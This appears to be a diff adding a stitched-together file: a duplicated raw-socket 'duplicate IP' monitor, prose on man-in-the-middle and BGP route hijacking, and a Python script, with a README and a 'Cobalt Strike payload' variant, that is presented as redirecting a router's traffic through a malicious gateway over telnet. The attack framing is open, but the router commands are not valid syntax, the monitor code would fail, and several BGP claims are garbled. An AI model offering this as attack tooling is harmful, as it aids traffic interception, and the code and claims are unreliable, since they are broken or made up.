@@ -1,0 +1,158 @@
+
+import socket
+
+# Create a socket object
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+
+# Define list to store IP data
+ip_list = []
+
+while True: # Monitor continuously
+
+    # Receive data from the socket
+    data = s.recv(4096)
+
+    # Extract the IP address from the data
+    ip_address = data[0:4]
+
+    # Check if the IP address is already in the list
+    if ip_address not in ip_list:
+        # Add IP address to list
+        ip_list.append(ip_address)
+    else:
+        # Duplicate IP address found
+        print("Duplicate IP address detected: " + ip_address)
+
+        # Alert user
+        print("Alerting user...")
+
+
+import socket
+
+# Create a socket object
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+
+# Define list to store IP data
+ip_list = []
+
+while True: # Monitor continuously
+
+    # Receive data from the socket
+    data = s.recv(4096)
+
+    # Extract the IP address from the data
+    ip_address = data[0:4]
+
+    # Check if the IP address is already in the list
+    if ip_address not in ip_list:
+        # Add IP address to list
+        ip_list.append(ip_address)
+    else:
+        # Duplicate IP address found
+        print("Duplicate IP address detected: " + ip_address)
+
+        # Alert user
+        print("Alerting user...")
+
+
+Man-in-the-middle (MitM) attacks are capable of re-routing an IP address to go through a mirror gateway and loop back to where the IP was going to by exploiting weaknesses in the system. These weaknesses can be in the form of poor security measures, unencrypted network traffic, or a lack of authentication. Once the attacker has access, they can change the IP address of the targeted device and route it through a malicious gateway. This gateway will act as a mirror, allowing the attacker to view and modify any traffic that comes through. They can then redirect the traffic back to the original destination, allowing them to monitor, modify, or steal data as it passes through the gateway.
+
+    There are several methods of detecting if an IP address is being mirrored. One of the most common is to use a network monitoring tool, such as Wireshark, to inspect the traffic coming and going from the IP address. If the IP address is being mirrored, the monitoring tool will be able to detect the duplicate packets and alert the user. Another method is to perform a traceroute to the IP address and look for any suspicious activity or redirection. Finally, the user can also check the logs of their router or firewall to see if any malicious traffic is being sent to or from the IP address.
+
+The first instance of the sender's IP address is usually logged by the web server, as the web server is the first point of contact for the request. The IP address is typically stored in the server's log files, which can be accessed to view the IP address of the sender.
+
+    The route that a packet is sent is determined by its destination IP address. Each packet contains a destination IP address, which is used by the router to determine the best route that the packet should take. The router looks at the routing table to find the best path to the destination and then sends the packet along that route. The routing table contains a list of potential paths and the associated cost of each route. The router then chooses the route with the lowest cost.
+
+    The routing table is regulated by the Border Gateway Protocol (BGP). BGP is a protocol that is used to exchange routing information across the Internet. It is responsible for maintaining accurate routing information by exchanging information between routers. BGP allows routers to build a table of available routes, which are then used to determine the best route for a packet to take.
+
+    The routing table can be used to redirect traffic through a mirror gateway using BGP. BGP allows routers to update the routing table with additional routes, which can then be used to redirect traffic to a mirror gateway. Once the traffic has been redirected, BGP can be used to forward the traffic on to its original destination.
+
+    BGP allows the router to update the routing table with the mirror gateway between the origin and the destination by using BGP path attributes. A BGP path attribute is a combination of values that is added to the path information for a route. These path attributes can be used to indicate a route that should be used to redirect traffic to a mirror gateway. The router can then use this information to update the routing table and route traffic to the mirror gateway.
+
+
+    There is no standardized base list of BGP path attributes for the initial routing table. The path attributes for a route are determined by the router as it processes the route. Different routers may have different path attributes for the same route, depending on their configuration.
+
+      Two different routers with the same origin and destinations can follow the same path but have different routing table attributes configured. This is because each router's configuration is unique and can be modified to suit the particular needs of the user. Different configurations may lead to different path attributes being assigned to the same route.
+
+    The modification of path attributes configurations typically requires administrator privileges. However, some routers may be configured to allow remote access and modification, depending on the configuration settings.
+
+      A hacker can modify the attributes in such a way as to not be detected. This is because routers typically only verify the authenticity of the source of a route and not the authenticity of the path attributes. This means that a hacker can modify the path attributes and the router will accept the changes without any verification. The hacker could then use the modified route to redirect traffic to the malicious gateway without the user being aware of the change.
+
+   The hacker would need to gain access to the router's configuration settings in order to modify the path attributes. This could be done by exploiting weaknesses in the router's security, such as unencrypted network traffic or a lack of authentication. Once the hacker has access, they can modify the attributes without detection and use the modified route to redirect traffic to the malicious gateway, see the shell script below:
+
+#!/usr/bin/env python3
+
+import os
+
+# Get router's IP address
+router_ip = input("Enter router's IP address: ")
+
+# Get gateway's IP address
+gateway_ip = input("Enter gateway's IP address: ")
+
+# Modify path attributes
+command = f"telnet {router_ip} config t route-map set ip next-hop {gateway_ip}"
+
+# Execute command
+os.system(command)
+
+# Enable persistent routing
+command = f"telnet {router_ip} config-route-map persist"
+
+# Execute command
+os.system(command)
+
+# Exit
+print("Routing successfully modified.")
+
+
+
+
+README 
+
+This type of code is designed to demonstrate a vulnerability being exploited by Russian state-controlled censorship authorities that have automated the modification of path attributes configurations in a BGP router's routing table, which will allow for persistent routing through a gateway without being detected. You can detect this type of suripticious surveillance by validating the route announcements and match it to IPs with self-signed CAs and mismatched SSL certificates.
+
+The software should be run on a Linux system and requires Python 3. It is recommended to use a virtual environment to ensure compatibility of the packages used in this software.
+
+To get started: 
+1. Clone the repository 
+2. Activate the virtual environment 
+3. Install the necessary packages using the requirements.txt file 
+4. Run the program 
+
+DEVELOPER NOTES 
+
+This software was developed using Python 3. All packages used are listed in the requirements.txt file, which should be used to install the necessary packages before running the program. 
+
+The program takes the IP address of the router and the IP address of the gateway as input from the user. It then uses the telnet command to modify the path attributes configuration in the router's routing table and enable persistent routing through the gateway. 
+
+LICENSE 
+
+This software is released under the MIT License. See the LICENSE file for details.
+
+This is the same code as a subprocess that is wrapped for payload on a cobalt strike intrusion:
+
+#!/usr/bin/env python3
+
+import subprocess
+
+# Get router's IP address
+router_ip = input("Enter router's IP address: ")
+
+# Get gateway's IP address
+gateway_ip = input("Enter gateway's IP address: ")
+
+# Modify path attributes
+command = f"telnet {router_ip} config t route-map set ip next-hop {gateway_ip}"
+
+# Execute command
+subprocess.run(command, shell=True)
+
+# Enable persistent routing
+command = f"telnet {router_ip} config-route-map persist"
+
+# Execute command
+subprocess.run(command, shell=True)
+
+# Exit
+print("Routing successfully modified.")
